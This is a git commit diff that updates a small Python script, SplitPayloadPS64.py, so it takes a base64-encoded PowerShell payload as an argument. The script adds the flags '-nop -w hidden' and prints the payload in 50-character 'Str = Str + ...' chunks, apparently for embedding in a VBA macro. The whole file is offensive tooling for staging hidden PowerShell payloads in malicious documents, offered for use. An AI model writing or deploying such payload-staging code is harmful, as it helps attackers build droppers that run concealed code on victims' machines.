d15ee3c0b2057f7d13e51d905724049a49873649
Sergio Monge <82247215+SergioDispla@users.noreply.github.com>
2022-05-16 22:07:28 -0400

    Automated Scritp. Allows to pass the based64 payload as argument.

--- SplitPayloadPS64.py
+++ SplitPayloadPS64.py
@@ -1,8 +1,19 @@
 #!/usr/bin/python
 
-#Insert your payload Based64 below: Format <powershell.exe -nop -w hidden -e CODE>
-payload = ' ' 
+import sys
 
+#Verify the numbers of arguments
+if len(sys.argv) < 2:
+	print("[!] Use: python " + sys.argv[0] + " <payload-based64>")
+	sys.exit(0)
+
+#Saved the argument as a variable
+str = sys.argv[1]
+
+#Insert the additional arguments needed for the payload
+payload= str[:10] + ".exe -nop -w hidden " + str[11:]
+
+#Split the payload in blocks of 50 characters
 n = 50
 for i in range(0, len(payload), n):
-    print "Str = Str + " + '"' + str[i:i+n] + '"'
+    print("Str = Str + " + '"' + payload[i:i+n] + '"')
